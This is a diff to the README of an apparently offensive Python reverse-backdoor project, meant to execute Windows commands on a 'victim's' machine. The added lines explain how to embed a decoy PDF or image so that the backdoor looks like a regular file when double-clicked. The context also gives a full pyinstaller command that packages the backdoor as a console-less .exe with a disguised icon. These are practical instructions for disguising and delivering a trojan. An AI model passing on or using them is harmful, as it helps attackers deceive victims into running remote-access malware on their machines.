@@ -22,6 +22,8 @@ The given Python code when executed on the Victim's machine, can execute any Win
 
 **Note that:**
   - The to re-package the Backdoor into a .exe and then change its icon, u need to have an icon downloaded, and then run the command in the command prompt.
+  - You can also toggle what opens when a user double-clicks a file. As in, it can open a PDF or an image, when opened; it will show a regular file (that is embedded with it).
+  
   > ` C:\Python39\Scripts\pyinstaller.exe –add-data “path of the file to be embedded with .exe” --onefile –noconsole --icon “path/of/icon.ico” reverse_backdoor_Class.py ` 
   
   > ` "path of the file to be embedded with .exe" ` == PATH of The frontend file you want the backdoor to run if its double clicked, like a .pdf, .png, .jpeg, etc.
